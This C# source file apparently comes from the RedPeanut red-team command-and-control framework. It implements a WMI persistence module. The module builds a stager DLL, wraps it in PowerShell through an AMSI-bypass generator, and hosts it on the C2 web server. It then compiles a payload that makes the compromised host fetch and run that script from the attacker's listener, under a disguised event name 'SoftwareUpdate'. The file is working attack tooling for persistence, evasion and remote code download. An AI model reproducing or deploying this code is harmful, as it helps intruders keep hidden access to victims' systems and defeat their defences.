//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class PersWMIManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set eventname", "Event name" },
            { "set processname", "Process name" },
            { "set encoded", "Encode command in base64" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "wmi";
        string processname = "notepad.exe";
        string eventname = "SoftwareUpdate";
        bool encoded = false;
        bool ssl = true;
        bool exit = false;

        public PersWMIManager()
        {

        }

        public PersWMIManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                PersRegistryMenu(input);
            } while (!exit);
        }

        private void PersRegistryMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set eventname":
                            eventname = GetParsedSetString(input);
                            break;
                        case "set processname":
                            processname = GetParsedSetString(input);
                            break;
                        case "set encoded":
                            encoded = GetParsedSetBool(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }

        private void Run()
        {
            try
            {
                List<string> args = new List<string>();
                if (!string.IsNullOrEmpty(processname) && !string.IsNullOrEmpty(eventname))
                {
                    //Create webresource
                    //Register web resource

                    string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                    string filename = RandomAString(10, new Random()).ToLower();
                    ListenerConfig conf = new ListenerConfig("",
                        ((AgentInstanceHttp)agent).GetAddress(),
                        ((AgentInstanceHttp)agent).GetPort(),
                        Program.GetC2Manager().GetC2Server().GetProfile(((AgentInstanceHttp)agent).GetProfileid()),
                        ((AgentInstanceHttp)agent).GetProfileid());

                    string source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                    source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), 40, conf);

                    string assemblyBase64 = Builder.GenerateDllBase64(source, filename + ".dll");

                    byte[] assemblybytte = Convert.FromBase64String(assemblyBase64);
                    string agentCompBase64 = Convert.ToBase64String(CompressAssembly(assemblybytte));

                    Dictionary<string, string> argagent = new Dictionary<string, string>();
                    argagent.Add("#{bytelen}", assemblybytte.Length.ToString());

                    string uricontent = Program.GetC2Manager().GetC2Server().GetProfile(((AgentInstanceHttp)agent).GetProfileid()).ContentUri;

                    uricontent = uricontent.TrimStart('/');

                    if (!uricontent.EndsWith("/"))
                        uricontent += "/";

                    Dictionary<string, string> arg = new Dictionary<string, string>
                    {
                        { "#{lhost}", ((AgentInstanceHttp)agent).GetAddress() },
                        { "#{lport}", ((AgentInstanceHttp)agent).GetPort().ToString() },
                        { "#{uri}", uricontent + "s2_" + filename + ".ps1" }
                    };

                    PowershellAmsiGenerator gen_s1 = new PowershellAmsiGenerator(agentCompBase64, arg);
                    PowershellAgentGenerator gen_s2 = new PowershellAgentGenerator(agentCompBase64, argagent);

                    //Add resource to webserver storage
                    C2Manager c2manager = Program.GetC2Manager();

                    c2manager.GetC2Server().RegisterWebResource(filename + ".ps1", new WebResourceInstance(gen_s1, filename + ".ps1"));
                    c2manager.GetC2Server().RegisterWebResource("s2_" + filename + ".ps1", new WebResourceInstance(gen_s2, "s2_" + filename + ".ps1"));
                    Console.WriteLine("[*] Resource added to webserver resources");

                    string proto = "";

                    if (ssl)
                        proto = "https";
                    else
                        proto = "http";

                    string url = string.Format("{0}://{1}:{2}/{3}{4}",proto, ((AgentInstanceHttp)agent).GetAddress(), ((AgentInstanceHttp)agent).GetPort(),uricontent, filename + ".ps1");

                    string perssrc = File.ReadAllText(Path.Combine(folderrpath, PERSWMI_TEMPLATE));

                    perssrc = Replacer.ReplacePersWMI(perssrc, eventname, url, processname, encoded);

                    RunAssemblyBase64(
                        Convert.ToBase64String(
                            CompressGZipAssembly(
                                Builder.BuidStreamAssembly(perssrc, RandomAString(10, new Random()).ToLower() + ".dll",40, compprofile: CompilationProfile.Persistence)
                                )
                            ), 
                        "PersWMI", 
                        new string[] { " " },
                        agent);

                    return;
                }
            }
            catch(Exception e)
            {
                Console.WriteLine("[x] Error generating task {0}", e.Message);
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "eventname", eventname },
                { "processname", processname },
                { "encoded", encoded.ToString() }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
